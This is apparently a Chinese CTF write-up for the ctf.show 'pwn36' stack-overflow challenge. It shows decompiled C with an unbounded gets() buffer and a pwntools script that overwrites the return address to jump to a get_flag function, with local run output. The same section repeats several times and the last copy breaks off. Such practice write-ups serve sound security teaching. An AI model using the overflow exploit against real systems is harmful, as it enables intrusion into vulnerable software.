<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-4"><a href="#pwn36-4" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-5"><a href="#pwn36-5" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-6"><a href="#pwn36-6" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-7"><a href="#pwn36-7" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
